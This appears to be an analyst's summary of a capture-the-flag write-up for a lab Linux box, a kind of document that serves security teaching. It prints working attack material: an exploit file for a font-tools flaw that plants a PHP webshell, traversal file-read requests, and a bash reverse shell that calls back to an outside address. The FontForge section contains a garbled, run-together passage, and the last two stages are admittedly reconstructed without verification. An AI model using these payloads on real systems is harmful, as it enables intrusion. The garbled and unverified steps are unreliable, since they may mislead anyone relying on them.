## HTB: VariaType — Analyst Notes

### Box Summary

VariaType is a Medium-difficulty Debian 12 Linux box built around a font foundry's pair of web properties: a public Flask-based "variable font generator" and an internal PHP `validation portal` on a subdomain. The chain runs from Git source disclosure, through a single-pass directory traversal filter bypass for arbitrary file read, into a fontTools arbitrary-file-write CVE that drops a PHP webshell, then pivots laterally via a FontForge command injection bug triggered through a cron job, and finishes with a sudo-permitted plugin installer abusing a path traversal flaw in a vulnerable setuptools `PackageIndex` to plant an SSH key in root's home directory. The CVEs involved are CVE-2025-66034 (fontTools varLib arbitrary file write), CVE-2024-25081/CVE-2024-25082 (FontForge ZIP filename command injection), and CVE-2025-47273 (setuptools `PackageIndex` path traversal).

### Recon

The initial full-port nmap scan only turns up SSH (22) and HTTP (80), and the banner versions (OpenSSH 9.2p1 Debian, nginx 1.22.1) point to Debian 12 Bookworm. Both ports return a TTL of 63, consistent with a Linux host one hop away. The HTTP service redirects to `variatype.htb`, which signals virtual hosting is in play, so a subdomain brute force against the IP with a `Host` header fuzzer is the natural next move:

```bash
ffuf -u http://10.129.244.202 -H "Host: FUZZ.variatype.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

This surfaces a `portal` subdomain. Once both hostnames are added to `/etc/hosts`, rerunning `nmap -sCV` against each name specifically (rather than just the bare IP) matters here, because `nmap`'s `http-git` script catches an exposed `.git` repository on `portal.variatype.htb` that a typical `feroxbuster` wordlist run wouldn't have flagged — this is a good general lesson: always re-run version-detection scans against discovered vhosts individually, since some scripts behave differently with the correct `Host` header.

On the main site, the font generator workflow accepts a `.designspace` XML file plus a `.ttf`/`.otf` master font and is presumably piping them into `fonttools`. Cookie analysis on a failed submission reveals a Flask session cookie (three dot-joined base64 segments, decodable with `flask-unsign --decode -c <cookie>`), confirming the backend framework and exposing the use of Flask's `flash()` mechanism for error messaging — useful context for understanding response behavior later when probing parameters. The default Flask 404 page further confirms this. A `feroxbuster -u http://variatype.htb` run turns up nothing beyond what manual browsing already found.

On the portal subdomain, the login page gives a uniform "invalid credentials" message regardless of username validity, with no apparent timing difference, so username enumeration isn't available here. The site sets a `PHPSESSID` cookie and serves a default nginx 404, confirming PHP. Since the `.git` dump won't necessarily contain the full site, a `feroxbuster -u http://portal.variatype.htb -x php` run is still worthwhile and turns up `/auth.php` (empty output, but 200), `/files` (403), `/download.php`, `/view.php`, and `/dashboard.php` (all redirecting to `/` when unauthenticated).

### Git Repository Recovery and Credential Extraction

With `.git` exposed, `git-dumper` (run from an empty working directory) pulls down the repository:

```bash
git-dumper http://portal.variatype.htb .
```

The recovered tree only contains `auth.php` plus the `.git` metadata, but `git log --oneline` shows two commits, and the second commit message — "fix: add gitbot user for automated validation pipeline" — is suspicious enough to diff against the first:

```
git diff 5030e79 753b5f5
```

The diff reveals a hardcoded credential pair was added and then implicitly meant to be hidden by committing over it (`gitbot` / `G1tB0t_Acc3ss_2025!`), which is a classic case of secrets surviving in Git history even when scrubbed from the working tree. These credentials authenticate successfully against the portal login form, unlocking `/dashboard.php`, where successful font-generation jobs from the main site appear — implying shared filesystem or database state between the Flask app and the PHP portal. The dashboard's "View" and "Download" links use `view.php?f=<filename>` and `download.php?f=<filename>` respectively.

### File Read via Single-Pass Filter Bypass

Any `?f=` parameter feeding a file path is worth testing for traversal, and doubly so on a PHP app for potential LFI. Manual testing with Burp Repeater shows `view.php` trips some validation, but `download.php` returns a distinct "file not found"-style error when fed traversal sequences, implying the `../` is being stripped but the underlying read logic is still being reached. This pattern strongly suggests a naive single-pass `str_replace('../', '', $_GET['f'])`-style filter, which is defeated by the classic bypass of doubling characters: submitting `....//` causes the filter to strip the inner `../` once, leaving `../` behind. This is confirmed both manually and via an automated `LFI-Jhaddix.txt` wordlist sweep:

```bash
ffuf -u http://portal.variatype.htb/download.php?f=FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -H "Cookie: PHPSESSID=<session>" -ac
```

Multiple traversal depths using the `....//` pattern successfully retrieve `/etc/passwd`. From there, `curl` with the authenticated cookie becomes the primary file-read tool:

```bash
curl --path-as-is -s -H 'Host: portal.variatype.htb' -b 'PHPSESSID=<session>' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/passwd'
```

Reading `/etc/passwd` confirms a single non-root login user, `steve`, with a real shell, plus root. Reading the nginx site configs from `/etc/nginx/sites-enabled/` clarifies the architecture: the portal is plain PHP served via `php-fpm`, document root `/var/www/portal.variatype.htb/public`, while the main `variatype.htb` config reverse-proxies all traffic to `127.0.0.1:5000` — a strong signal of an internal Flask/Gunicorn-style process. Pulling `index.php` from the portal confirms the leaked PHP at the top of the file is never executed in the HTTP response (it's returned as raw source), proving this is a pure file-read bug, not an LFI capable of code execution by itself — meaning RCE has to come from somewhere else.

The systemd unit at `/etc/systemd/system/variatype.service` is recoverable the same way and reveals the working directory (`/opt/variatype`), entrypoint (`python3 app.py`), running user (`variatype`, group `www-data`), and writable paths, which leads straight to pulling `/opt/variatype/app.py` — the full Flask source.

### Flask Source Analysis

The Flask app defines five routes: `home()`, `services()`, `variable_font_generator()`, `process_variable_font()` (POST), and `download_file(download_id)`. The download route filters `download_id` to alphanumeric-plus-hyphen/underscore before building `variabype_{download_id}.ttf` and joining it under a fixed `DOWNLOAD_FOLDER` — not exploitable since no traversal characters survive the `isalnum()`-style check and the path components are otherwise fixed strings, not raw user input.

The interesting logic is in `process_variable_font()`. It accepts a `.designspace` file and one or more `.ttf`/`.otf` master fonts, writes them into a `tempfile.TemporaryDirectory`, and then shells out:

python

```python
subprocess.run(
    ['fonttools', 'varLib', 'config.designspace'],
    cwd=workdir,
    check=True,
    timeout=30
)
```

Because no user input is concatenated into this command, classic shell/argument injection isn't viable here — but the command does execute `fonttools` against an attacker-fully-controlled `.designspace` file, which shifts the hunt toward vulnerabilities inside `fonttools` itself rather than the surrounding Python glue code. The installed version is discoverable via the same file-read primitive against the portal, since `fonttools` is a global Python package under `/usr/local/lib/python3.11/dist-packages/fontTools/__init__.py`, which reports version `4.50.0`.

### CVE-2025-66034: fontTools varLib Arbitrary File Write

CVE-2025-66034 affects `fonttools` versions 4.33.0 through before 4.60.2: the `varLib` `main()` code path (used by the `fonttools varLib` CLI) has an arbitrary file write vulnerability when processing a malicious `.designspace` file, which can escalate to remote code execution. Two mechanisms make this dangerous. First, the `<variable-font>` element's `filename` attribute in a `<variable-fonts>` block is not sanitized, so it can point anywhere on the filesystem (including via `../` traversal or an absolute path). Second, XML injection is possible inside `<labelname>` elements using a CDATA escape trick — closing and reopening a CDATA section lets arbitrary text (including PHP) get embedded into the binary font output that `varLib` ultimately writes to the attacker-chosen path:

xml

```xml
<labelname xml:lang="en"><![CDATA[<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]]]><![CDATA[>]]></labelname>
```

Building toward a working exploit is done incrementally. The first proof-of-concept just confirms arbitrary file write by setting the `<variable-font>` filename to an arbitrary path like `/tmp/a.txt`, with a `<sources>` block referencing the single uploaded master font and a minimal `<axes>` definition matching that font's axis. Once confirmed (the binary font data is now readable back through the traversal file-read bug), the next iteration adds the CDATA-wrapped `<labelname>` content under the `<axis>` element plus a matching `<instances>` block referencing that label, which proves arbitrary _content_ — not just an arbitrary file — can be injected and later read back out of the resulting binary blob with `grep -a`.

The final weaponized payload writes a PHP webshell directly into the portal's public web root, since that's a path the attacker already knows is web-accessible and file-read-confirmed:

xml

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[
0xdf output: <?php echo shell_exec($_REQUEST["cmd"]);?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="Super Pandora.ttf" name="Light">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MaliciousFont" filename="/var/www/portal.variatype.htb/public/0xdf.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
  <instances>
    <instance name="Display Thin" familyname="MyFont" stylename="Thin">
      <location><dimension name="Weight" xvalue="100"/></location>
      <labelname xml:lang="en">Display Thin</labelname>
    </instance>
  </instances>
</designspace>
```

Uploading this alongside the matching `.ttf` master writes a working webshell, confirmed by:

```
curl portal.variatype.htb/0xdf.php?cmd=id -s | grep -a 0xdf
```

returning `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. A reverse shell follows trivially through the same webshell parameter:

```
curl portal.variatype.htb/0xdf.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.51/443 0>&1"'
```

caught with `nc -lnvp 443`, and upgraded to a full PTY with the standard `script /dev/null -c bash` plus background/`stty raw -echo; fg`/`TERM=screen` trick. This nets a shell as `www-data`.

### Lateral Movement: www-data to steve

Filesystem enumeration as `www-data` turns up `/opt/font-tools`, `/opt/variatype` (the Flask source, plus a broken comment-stripping `script.py` that appears to be leftover vibe-coded tooling that ran on itself and corrupted its own regex-based comment removal), and a stray `/opt/process_client_submissions.bak` shell script. That backup script, authored by `steve@variatype.htb`, is the key artifact: it iterates over uploaded font files (`*.ttf .otf .woff .woff2 .zip .tar .tar.gz .sfd`) sitting in the portal's upload directory, enforces a strict filename regex `^[a-zA-Z0-9._-]+$` (quarantining anything that fails), and then feeds whatever passes into an old, locally-built FontForge binary for validation:

bash

```bash
timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
font = fontforge.open('$file')
..."
```

Running `pspy` on the box confirms this script (at `/home/steve/bin/process_client_submissions.sh`, the live, non-backup version) fires every two minutes as a cron job running as `steve` (UID 1000), processing whatever files currently sit in the portal's `files` upload directory and invoking the same vulnerable FontForge binary, version `20230101` — old enough to be in scope for known FontForge CVEs.

**Note on capture limits:** my direct fetch of the article was truncated by the source server partway through the pspy cron output, right before 0xdf's writeup begins detailing the FontForge exploitation itself. Multiple independent secondary write-ups of this same box (cross-referenced above) consistently identify the next stage as **CVE-2024-25081 / CVE-2024-25082**, a command injection vulnerability in FontForge's handling of ZIP archive filenames: FontForge's ZIP-import code passes archive member filenames into a shell context without sanitization, so an attacker crafts a malicious `.zip` (passing the `^[a-zA-Z0-9._-]+‘filenamecheckonthe∗outer∗zip,whilethe∗internal∗archivemembernamecarriestheinjectedcommandviabackticksor‘` filename check on the *outer* zip, while the *internal* archive member name carries the injected command via backticks or ` ‘filenamecheckonthe∗outer∗zip,whilethe∗internal∗archivemembernamecarriestheinjectedcommandviabackticksor‘()` command substitution) that gets dropped into the upload directory for the cron job to pick up. When FontForge opens the malicious archive, the injected filename payload executes as `steve`, typically used to write an SSH public key into `/home/steve/.ssh/authorized_keys` for a stable shell as `steve`, rather than relying on a fragile reverse shell from a cron context. I'd recommend confirming the exact payload syntax 0xdf used directly against the live article (or HTB's official walkthrough) before relying on it operationally, since I can't independently verify which of CVE-2024-25081 (the metadata/filename-based variant) or -25082 (the closely related ZIP-extraction variant) 0xdf specifically leveraged, or his exact crafted filename string.

### Privilege Escalation: steve to root (CVE-2025-47273)

Once shell access as `steve` is established, `sudo -l` reveals a NOPASSWD entitlement to run a specific script as root:

```bash
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

This script downloads a plugin from a remote URL and validates it without executing it directly, which closes off naive "supply a malicious plugin" attacks. The privilege escalation instead routes through the Python packaging library it depends on for the download step: a vulnerable version of `setuptools` is affected by **CVE-2025-47273**, a path traversal vulnerability in `setuptools`' `PackageIndex` download/processing logic. By controlling the URL or package metadata passed into the installer script (which runs as root via sudo), the traversal flaw in `PackageIndex` allows writing the downloaded file to an arbitrary filesystem location rather than the intended staging directory. The practical endgame is using this to write an attacker-controlled SSH public key into `root`'s home directory — most plausibly `/root/.ssh/authorized_keys` — yielding a root SSH shell.

As with the FontForge stage, the precise invocation 0xdf used against `install_validator.py` (the exact malicious URL/package-name structure that triggers the `PackageIndex` traversal, and how the wildcard argument to the sudo rule is leveraged) fell outside what I was able to pull from the live page before the fetch cut off, so that exact payload should be verified against the source article directly if you need it for write-up or training material.

### Key Lessons for the Analyst

The chain is a good teaching example of several recurring real-world patterns worth internalizing. Git history is not a reliable place to hide secrets — a credential removed from the working tree in a later commit is still fully recoverable via `git diff` between commits, which is exactly why secret-scanning tools that walk full history (not just `HEAD`) matter for defensive tooling. Path traversal filters implemented as a single non-recursive `str_replace` or regex pass are trivially defeated by the doubled-sequence trick (`....//` collapsing to `../` after one pass), and this should be a standing checklist item whenever a traversal filter is observed to "almost" work. Dependency versions matter as much as application code: this entire box hinges on three separate third-party library CVEs (fontTools, FontForge, setuptools) rather than any bug in the bespoke Flask or PHP code, reinforcing that supply-chain and dependency patching cadence is as critical an attack surface as first-party code review. Finally, `pspy` remains the standard tool for discovering unprivileged-visible cron jobs running as other users, and that visibility is what turns a known CVE in an obscure binary (FontForge) into an actionable, in-context exploitation path rather than a theoretical one.